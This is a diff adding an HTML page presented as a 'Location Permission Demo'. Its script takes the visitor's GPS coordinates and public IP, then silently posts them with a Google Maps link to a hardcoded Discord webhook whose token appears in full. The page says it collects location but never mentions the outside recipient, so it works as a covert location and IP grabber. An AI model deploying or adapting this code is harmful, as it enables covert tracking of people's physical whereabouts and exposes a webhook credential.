@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Location Demo</title>
+
+<style>
+body{
+    margin:0;
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    background:#0f172a;
+    font-family:Arial,sans-serif;
+    color:white;
+}
+
+.card{
+    background:#1e293b;
+    padding:30px;
+    border-radius:16px;
+    width:350px;
+    text-align:center;
+}
+
+button{
+    width:100%;
+    padding:12px;
+    border:none;
+    border-radius:10px;
+    background:#22c55e;
+    color:white;
+    cursor:pointer;
+    font-size:16px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+
+<h2>Location Permission Demo 🌍</h2>
+
+<p>
+This demo will collect your IP and location
+after permission is granted.
+</p>
+
+<button onclick="startDemo()">
+Allow Location
+</button>
+
+</div>
+
+<script>
+async function startDemo(){
+
+    navigator.geolocation.getCurrentPosition(
+
+        async function(position){
+
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            let ip = "Unknown";
+
+            try{
+                const res = await fetch(
+                    "https://api.ipify.org?format=json"
+                );
+
+                const data = await res.json();
+
+                ip = data.ip;
+
+            }catch(err){
+                console.log(err);
+            }
+
+            // Discord webhook
+            const webhook =
+                "https://discord.com/api/webhooks/1504694890930639069/zdHr3v-LEdqVaYYoZ1Y3WmNQP4t4U6RoZ3K5nEUIaoXp9Pnb0-IHSI02t3cOYWqv7_26";
+
+            const payload = {
+                content:
+`📍 Location Demo
+
+IP: ${ip}
+
+Latitude: ${lat}
+Longitude: ${lon}
+
+Google Maps:
+https://www.google.com/maps?q=${lat},${lon}`
+            };
+
+            // Send to webhook
+            fetch(webhook, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            });
+
+            // Open Google Maps
+            window.open(
+                `https://www.google.com/maps?q=${lat},${lon}`,
+                "_blank"
+            );
+        },
+
+        function(error){
+
+            alert("Location permission denied.");
+        }
+    );
+}
+</script>
+
+</body>
+</html>
